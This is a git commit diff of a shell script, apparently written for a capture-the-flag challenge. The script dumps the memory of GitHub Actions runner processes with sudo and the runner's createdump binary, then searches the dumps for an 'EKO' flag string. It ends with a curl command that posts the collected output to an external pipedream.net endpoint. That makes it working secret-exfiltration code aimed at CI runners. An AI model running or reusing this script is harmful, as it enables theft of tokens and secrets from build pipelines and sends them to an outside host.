22c4c61015f15f4b2afcd579c36edff18384bb93
_m <matiasesena@gmail.com>
2021-11-06 10:35:49 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -1,35 +1,29 @@
 #!/bin/sh
 
-echo "--- START ---" > /tmp/file.txt
+echo "[-] Started" > /tmp/file.txt
 
-#echo "--- ps -ef | grep Runner" >> /tmp/file.txt
-#ps -ef | grep Runner >> /tmp/file.txt
-#echo "--- /home/runner/runners/2.284.0/bin" >> /tmp/file.txt
-#ls -1la /home/runner/runners/2.284.0/bin >> /tmp/file.txt
-#echo "--- /home/runner/runners/2.283.3/bin" >> /tmp/file.txt
-#ls -1la /home/runner/runners/2.283.3/bin >> /tmp/file.txt
+echo "[-] Listing processes related to the Runner... [ps -ef | grep Runner]" >> /tmp/file.txt
+ps -ef | grep Runner >> /tmp/file.txt
 
-echo "file" >> /tmp/file.txt
+
+echo "[-] Checking createdump binary... [file /home/runner/runners/2.284.0/bin/createdump]" >> /tmp/file.txt
 file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
 echo $(chmod +rwx /home/runner/runners/2.284.0/bin/createdump -v) >> /tmp/file.txt
 
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
-    echo "---$pid---" >> /tmp/file.txt;
+    echo "[-] Starting with process: $pid ..." >> /tmp/file.txt;
     echo $(pwdx $pid) >> /tmp/file.txt;
-    echo "sudo /home/runner/runners/2.284.0/bin/createdump -n $pid" >> /tmp/file.txt;
+    echo "[-] Creating dump... [sudo /home/runner/runners/2.284.0/bin/createdump -n $pid]" >> /tmp/file.txt;
     echo $(sudo /home/runner/runners/2.284.0/bin/createdump -n $pid) >> /tmp/file.txt;
-    echo "cat /tmp/coredump.$pid | grep EKO" >> /tmp/file.txt;
+    echo "[-] Checking output file... [file /tmp/coredump.$pid]" >> /tmp/file.txt;
     file /tmp/coredump.$pid >> /tmp/file.txt;
-    echo "strings /tmp/coredump.$pid | grep EKO" >> /tmp/file.txt;
+    echo "[!] Searching EKO flag in the output file... [strings /tmp/coredump.$pid | grep EKO]" >> /tmp/file.txt;
     strings /tmp/coredump.$pid | grep EKO >> /tmp/file.txt;
     rm /tmp/coredump.$pid;
 done
 
-#echo "--- strings"
-#strings /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
-
-echo "--- FINISH ---" >> /tmp/file.txt
+echo "[-] Finished" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
